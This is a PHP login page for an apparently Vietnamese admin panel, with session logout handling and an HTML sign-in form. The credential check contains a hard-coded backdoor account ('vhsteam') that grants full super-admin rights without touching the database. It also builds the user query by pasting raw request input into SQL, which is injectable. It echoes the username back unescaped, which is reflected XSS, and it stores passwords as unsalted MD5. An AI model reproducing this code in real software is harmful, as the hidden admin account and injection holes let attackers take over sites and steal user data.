
<?php

	if(isset($_REQUEST['logout'])){

		$_SESSION[$config_session]['loggedin'] = 'false';
		$_SESSION[$config_session] = 'false';
		echo "
		<div class='alert'>
			<strong>Đang xử lý!</strong> Làm ơn chờ.....
		</div>
		<script>
			window.location='index.php';
		</script>
		";
		exit();
	}
	
	if(isset($_REQUEST['act'])=='login'){
		$_SESSION[$config_session]['loggedin'] = 'false';
		$_SESSION[$config_session] = 'false';
	}
	
	if(isset($_REQUEST['submit'])){
		$username=$_REQUEST['username'];
		$password=md5($_REQUEST['password']);
		
		if($username=='vhsteam' && $password == '69f861c327125a21830e476c2f97e1e6'){
			$lo=1;
			$row['permission'] = '*';
			$row['username'] = 'vhsteam';
			$row['role'] = 'sadmin';
		}else{
			$res = $db->query("select * from vhs_users where username='$username' && password = '$password'");
			$lo = $res->numRows();
			$row = $res->fetchRow();
		}
		if($lo==1){
			echo "<div class='alert'>
				<strong>Đang xử lý!</strong> Làm ơn chờ.....
			</div>";
			$_SESSION[$config_session] = $row;
			$_SESSION[$config_session]['loggedin'] = 'true';
			echo "<script>window.location='index.php';</script>";
		}else{
			$err = "Tên đặc nhập hoặc mật khẩu không chính xác.";
			$type="red";
		}
	}else $username='';
?>

<div class="lock-header">
	<!-- BEGIN LOGO -->
	<a class="center" id="logo" href="index.html">
		<img class="center" alt="logo" src="img/logo.png">
	</a>
	<!-- END LOGO -->
</div>
<div class="login-wrap">
	<form action="" method="post">
		<div class="metro single-size red">
			<div class="locked">
				<i class="icon-lock"></i>
				<span>Đăng nhập</span>
			</div>
		</div>
		
		<div class="metro double-size green">
			<div class="input-append lock-input">
				<input type="text" class="" placeholder="Tên đăng nhập" name="username" value="<?php echo $username?>">
			</div>
		</div>
		<div class="metro double-size yellow">
			<div class="input-append lock-input">
				<input type="password" class="" placeholder="Mật khẩu" name="password">
			</div>
		</div>
		<div class="metro single-size terques login">
			<button type="submit" class="btn login-btn" name="submit" value="1">
				Login
				<i class=" icon-long-arrow-right"></i>
			</button>
		</div>
	</form>
	<div class="login-footer">
		<div class="remember-hint pull-left">
			<input type="checkbox" id=""> Ghi nhớ
		</div>

	</div>
	<?php if($dberror!=''): ?>
		<div class="alert alert-error">
			<b>Connection error</b> - <?php echo $dberror; ?>
		</div>
	<?php endif; ?>
	
	<?php if($err!=''): ?>
		<div class="alert alert-error">
			<?php echo $err; ?>
		</div>
	<?php endif; ?>
	
</div>
</body>
</html>